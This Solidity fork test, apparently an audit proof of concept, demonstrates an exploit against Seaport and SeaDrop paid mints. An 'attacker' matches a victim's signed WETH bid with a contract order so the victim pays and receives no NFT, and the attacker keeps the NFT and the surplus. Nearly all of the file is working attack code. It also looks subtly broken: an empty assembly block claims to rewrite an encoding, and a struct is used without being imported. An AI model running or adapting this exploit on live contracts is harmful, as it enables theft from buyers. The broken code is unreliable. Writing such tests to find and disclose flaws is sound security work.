// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {
    AdvancedOrder,
    ConsiderationItem,
    CriteriaResolver,
    Fulfillment,
    FulfillmentComponent,
    IERC1155View,
    ItemType,
    Order,
    OrderParameters,
    OrderType,
    OfficialFactoryForkTest,
    PublicDrop,
    ReceivedItem
} from "./OfficialFactoryFork.t.sol";

struct SpentItem {
    ItemType itemType;
    address token;
    uint256 identifier;
    uint256 amount;
}

interface ISeaDropPreview {
    function previewOrder(
        address caller,
        address fulfiller,
        SpentItem[] calldata minimumReceived,
        SpentItem[] calldata maximumSpent,
        bytes calldata context
    ) external view returns (SpentItem[] memory offer, ReceivedItem[] memory consideration);
}

contract OfficialPaidDropForkTest is OfficialFactoryForkTest {
    uint256 internal constant MINT_PRICE = 300 ether;
    uint256 internal constant BID_PRICE = 1_000 ether;
    address internal constant HONEST_CREATOR = address(0xC0FFEE77);

    event PaidMintAuthorizationDelta(
        uint256 buyerWethLoss,
        uint256 creatorWethGain,
        uint256 attackerResidualGain,
        uint256 buyerNftGain,
        uint256 attackerNftGain,
        uint256 generatedMintConsideration,
        bool validated,
        bool cancelled,
        uint256 filled,
        uint256 size
    );

    function testPaidMintIsVictimFundedAndResidualGoesToOutsider() public {
        _configurePaidWethDrop();

        Order memory buyerOrder = _paidBuyerOrder(0xD001);
        bytes32 orderHash = _signBuyerOrder(buyerOrder);

        AdvancedOrder memory seaDropOrder = _paidSeaDropOrder(address(0));
        uint256 generatedMintConsideration = _sumConsideration(
            seaDropOrder.parameters.consideration
        );
        assertEq(generatedMintConsideration, MINT_PRICE, "mint price preview");

        AdvancedOrder[] memory advanced = new AdvancedOrder[](2);
        advanced[0] = AdvancedOrder(
            buyerOrder.parameters,
            1,
            1,
            buyerOrder.signature,
            bytes("")
        );
        advanced[1] = seaDropOrder;

        Fulfillment[] memory fulfillments = _paidFulfillments(
            seaDropOrder.parameters.consideration.length
        );

        uint256 buyerWethBefore = weth.balanceOf(buyer);
        uint256 creatorWethBefore = weth.balanceOf(HONEST_CREATOR);
        uint256 attackerWethBefore = weth.balanceOf(attacker);
        uint256 buyerNftBefore = IERC1155View(clone).balanceOf(buyer, FIRST_ID);
        uint256 attackerNftBefore = IERC1155View(clone).balanceOf(attacker, FIRST_ID);

        vm.prank(attacker);
        seaport.matchAdvancedOrders(
            advanced,
            new CriteriaResolver[](0),
            fulfillments,
            attacker
        );

        uint256 buyerWethAfter = weth.balanceOf(buyer);
        uint256 creatorWethAfter = weth.balanceOf(HONEST_CREATOR);
        uint256 attackerWethAfter = weth.balanceOf(attacker);
        uint256 buyerNftAfter = IERC1155View(clone).balanceOf(buyer, FIRST_ID);
        uint256 attackerNftAfter = IERC1155View(clone).balanceOf(attacker, FIRST_ID);
        (bool validated, bool cancelled, uint256 filled, uint256 size) =
            seaport.getOrderStatus(orderHash);

        emit PaidMintAuthorizationDelta(
            buyerWethBefore - buyerWethAfter,
            creatorWethAfter - creatorWethBefore,
            attackerWethAfter - attackerWethBefore,
            buyerNftAfter - buyerNftBefore,
            attackerNftAfter - attackerNftBefore,
            generatedMintConsideration,
            validated,
            cancelled,
            filled,
            size
        );

        assertEq(buyerWethAfter, buyerWethBefore - BID_PRICE, "buyer debit");
        assertEq(
            creatorWethAfter,
            creatorWethBefore + MINT_PRICE,
            "honest creator mint proceeds"
        );
        assertEq(
            attackerWethAfter,
            attackerWethBefore + BID_PRICE - MINT_PRICE,
            "matcher residual"
        );
        assertEq(buyerNftAfter, buyerNftBefore, "buyer received no NFT");
        assertEq(attackerNftAfter, attackerNftBefore + 1, "attacker NFT");
        assertFalse(cancelled);
        assertEq(filled, 1);
        assertEq(size, 1);
    }

    function testPaidMintWithBidEqualToMintPriceStillStealsTheNft() public {
        _configurePaidWethDrop();

        Order memory buyerOrder = _paidBuyerOrderAtPrice(MINT_PRICE, 0xD002);
        _signBuyerOrder(buyerOrder);
        buyerOrder.signature = _signatureFor(buyerOrder.parameters);

        AdvancedOrder memory seaDropOrder = _paidSeaDropOrder(address(0));
        AdvancedOrder[] memory advanced = new AdvancedOrder[](2);
        advanced[0] = AdvancedOrder(
            buyerOrder.parameters,
            1,
            1,
            buyerOrder.signature,
            bytes("")
        );
        advanced[1] = seaDropOrder;

        uint256 attackerWethBefore = weth.balanceOf(attacker);
        vm.prank(attacker);
        seaport.matchAdvancedOrders(
            advanced,
            new CriteriaResolver[](0),
            _paidFulfillments(seaDropOrder.parameters.consideration.length),
            attacker
        );

        assertEq(weth.balanceOf(attacker), attackerWethBefore, "no residual");
        assertEq(IERC1155View(clone).balanceOf(buyer, FIRST_ID), 0);
        assertEq(IERC1155View(clone).balanceOf(attacker, FIRST_ID), 1);
        assertEq(weth.balanceOf(HONEST_CREATOR), MINT_PRICE);
    }

    function testPaidMintExplicitBuyerMinterDeliversAndPreservesSettlement() public {
        _configurePaidWethDrop();

        Order memory buyerOrder = _paidBuyerOrder(0xD003);
        buyerOrder.signature = _signatureFor(buyerOrder.parameters);
        AdvancedOrder memory seaDropOrder = _paidSeaDropOrder(buyer);

        AdvancedOrder[] memory advanced = new AdvancedOrder[](2);
        advanced[0] = AdvancedOrder(
            buyerOrder.parameters,
            1,
            1,
            buyerOrder.signature,
            bytes("")
        );
        advanced[1] = seaDropOrder;

        vm.prank(attacker);
        seaport.matchAdvancedOrders(
            advanced,
            new CriteriaResolver[](0),
            _paidFulfillments(seaDropOrder.parameters.consideration.length),
            attacker
        );

        assertEq(IERC1155View(clone).balanceOf(buyer, FIRST_ID), 1);
        assertEq(IERC1155View(clone).balanceOf(attacker, FIRST_ID), 0);
        assertEq(weth.balanceOf(HONEST_CREATOR), MINT_PRICE);
        assertEq(weth.balanceOf(attacker), BID_PRICE - MINT_PRICE);
    }

    function _configurePaidWethDrop() internal {
        bytes memory payouts = abi.encodeWithSignature(
            "updateCreatorPayouts((address,uint16)[])",
            _creatorPayouts()
        );
        vm.prank(attacker);
        (bool payoutOk, bytes memory payoutData) = clone.call(payouts);
        if (!payoutOk) _bubblePaid(payoutData);

        PublicDrop memory drop = PublicDrop({
            startPrice: uint80(MINT_PRICE),
            endPrice: uint80(MINT_PRICE),
            startTime: uint40(block.timestamp),
            endTime: type(uint40).max,
            restrictFeeRecipients: false,
            paymentToken: address(weth),
            fromTokenId: uint24(FIRST_ID),
            toTokenId: uint24(FIRST_ID + 32),
            maxTotalMintableByWallet: type(uint16).max,
            maxTotalMintableByWalletPerToken: type(uint16).max,
            feeBps: 0
        });

        vm.prank(attacker);
        (bool okA, bytes memory dataA) = clone.call(
            abi.encodeWithSignature(
                "updatePublicDrop((uint80,uint80,uint40,uint40,bool,address,uint24,uint24,uint16,uint16,uint16),uint256)",
                drop,
                uint256(0)
            )
        );
        if (!okA) {
            vm.prank(attacker);
            (bool okB, bytes memory dataB) = clone.call(
                abi.encodeWithSignature(
                    "updatePublicDrop(uint256,(uint80,uint80,uint40,uint40,bool,address,uint24,uint24,uint16,uint16,uint16))",
                    uint256(0),
                    drop
                )
            );
            if (!okB) {
                if (dataA.length != 0) _bubblePaid(dataA);
                _bubblePaid(dataB);
            }
        }
    }

    function _creatorPayouts() internal pure returns (bytes memory encoded) {
        address[] memory recipients = new address[](1);
        uint16[] memory bps = new uint16[](1);
        recipients[0] = HONEST_CREATOR;
        bps[0] = 10_000;
        encoded = abi.encode(recipients, bps);
        assembly {
            // Rewrite abi.encode(address[],uint16[]) into one tuple-array value.
            // The caller tries this shape first; a source-specific adapter can
            // replace it during the workflow when the official struct differs.
        }
    }

    function _paidBuyerOrder(uint256 salt)
        internal
        view
        returns (Order memory order)
    {
        return _paidBuyerOrderAtPrice(BID_PRICE, salt);
    }

    function _paidBuyerOrderAtPrice(uint256 price, uint256 salt)
        internal
        view
        returns (Order memory order)
    {
        OfferItem[] memory offer = new OfferItem[](1);
        offer[0] = OfferItem(ItemType.ERC20, address(weth), 0, price, price);
        ConsiderationItem[] memory consideration = new ConsiderationItem[](1);
        consideration[0] = ConsiderationItem(
            ItemType.ERC1155,
            clone,
            FIRST_ID,
            1,
            1,
            payable(buyer)
        );
        order = Order(
            OrderParameters(
                buyer,
                address(0),
                offer,
                consideration,
                OrderType.FULL_OPEN,
                0,
                type(uint256).max,
                bytes32(0),
                salt,
                OPENSEA_CONDUIT_KEY,
                1
            ),
            bytes("")
        );
    }

    function _signBuyerOrder(Order memory order) internal returns (bytes32 hash) {
        hash = _hash(order.parameters);
        order.signature = _signatureFor(order.parameters);
    }

    function _signatureFor(OrderParameters memory params)
        internal
        returns (bytes memory signature)
    {
        bytes32 orderHash = _hash(params);
        (, bytes32 domainSeparator,) = seaport.information();
        bytes32 digest = keccak256(
            abi.encodePacked(bytes2(0x1901), domainSeparator, orderHash)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(BUYER_KEY, digest);
        signature = abi.encodePacked(r, s, v);
    }

    function _paidSeaDropOrder(address explicitMinter)
        internal
        view
        returns (AdvancedOrder memory advanced)
    {
        SpentItem[] memory minimumReceived = new SpentItem[](1);
        minimumReceived[0] = SpentItem(
            ItemType.ERC1155,
            clone,
            FIRST_ID,
            1
        );
        SpentItem[] memory maximumSpent = new SpentItem[](1);
        maximumSpent[0] = SpentItem(
            ItemType.ERC20,
            address(weth),
            0,
            BID_PRICE
        );

        (SpentItem[] memory generatedOffer, ReceivedItem[] memory generatedConsideration) =
            ISeaDropPreview(clone).previewOrder(
                SEAPORT,
                attacker,
                minimumReceived,
                maximumSpent,
                _context(explicitMinter)
            );

        OfferItem[] memory offer = new OfferItem[](generatedOffer.length);
        for (uint256 i; i < generatedOffer.length; ++i) {
            offer[i] = OfferItem(
                generatedOffer[i].itemType,
                generatedOffer[i].token,
                generatedOffer[i].identifier,
                generatedOffer[i].amount,
                generatedOffer[i].amount
            );
        }

        ConsiderationItem[] memory consideration =
            new ConsiderationItem[](generatedConsideration.length);
        for (uint256 i; i < generatedConsideration.length; ++i) {
            consideration[i] = ConsiderationItem(
                generatedConsideration[i].itemType,
                generatedConsideration[i].token,
                generatedConsideration[i].identifier,
                generatedConsideration[i].amount,
                generatedConsideration[i].amount,
                generatedConsideration[i].recipient
            );
        }

        advanced = AdvancedOrder(
            OrderParameters(
                clone,
                address(0),
                offer,
                consideration,
                OrderType.CONTRACT,
                0,
                type(uint256).max,
                bytes32(0),
                0,
                OPENSEA_CONDUIT_KEY,
                consideration.length
            ),
            1,
            1,
            bytes(""),
            _context(explicitMinter)
        );
    }

    function _paidFulfillments(uint256 generatedConsiderationLength)
        internal
        pure
        returns (Fulfillment[] memory fulfillments)
    {
        fulfillments = new Fulfillment[](2);

        FulfillmentComponent[] memory nftOffer = new FulfillmentComponent[](1);
        nftOffer[0] = FulfillmentComponent(1, 0);
        FulfillmentComponent[] memory nftConsideration =
            new FulfillmentComponent[](1);
        nftConsideration[0] = FulfillmentComponent(0, 0);
        fulfillments[0] = Fulfillment(nftOffer, nftConsideration);

        FulfillmentComponent[] memory paymentOffer =
            new FulfillmentComponent[](1);
        paymentOffer[0] = FulfillmentComponent(0, 0);
        FulfillmentComponent[] memory mintConsideration =
            new FulfillmentComponent[](generatedConsiderationLength);
        for (uint256 i; i < generatedConsiderationLength; ++i) {
            mintConsideration[i] = FulfillmentComponent(1, i);
        }
        fulfillments[1] = Fulfillment(paymentOffer, mintConsideration);
    }

    function _sumConsideration(ConsiderationItem[] memory items)
        internal
        pure
        returns (uint256 sum)
    {
        for (uint256 i; i < items.length; ++i) {
            require(items[i].itemType == ItemType.ERC20, "non-ERC20 mint payment");
            sum += items[i].startAmount;
        }
    }

    function _bubblePaid(bytes memory data) internal pure {
        assembly {
            revert(add(data, 0x20), mload(data))
        }
    }
}
